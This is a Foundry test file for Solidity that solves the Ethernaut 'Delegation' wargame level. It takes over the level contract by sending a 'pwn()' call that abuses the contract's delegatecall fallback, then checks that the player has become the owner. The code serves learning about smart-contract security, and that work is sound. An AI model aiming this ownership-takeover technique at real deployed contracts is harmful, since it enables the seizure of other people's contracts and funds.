// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {DelegationFactory} from "../src/Delegation/DelegationFactory.sol";
import {Delegation} from "../src/Delegation/Delegation.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    address payable player;

    function setUp() public {
        ethernaut = new Ethernaut();
        player = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("player")))))
        );
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testExploit() public {
        // Register level with Ethernaut contract
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);

        // Get a new level instance
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation delegationInstance = Delegation(payable(levelAddress));

        // Simulate exploit

        (bool sent, ) = address(delegationInstance).call(
            abi.encodeWithSignature("pwn()")
        );
        assert(sent);
        assertEq(delegationInstance.owner(), player);
        // Submit level

        bool levelSuccessFullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessFullyPassed);
    }
}
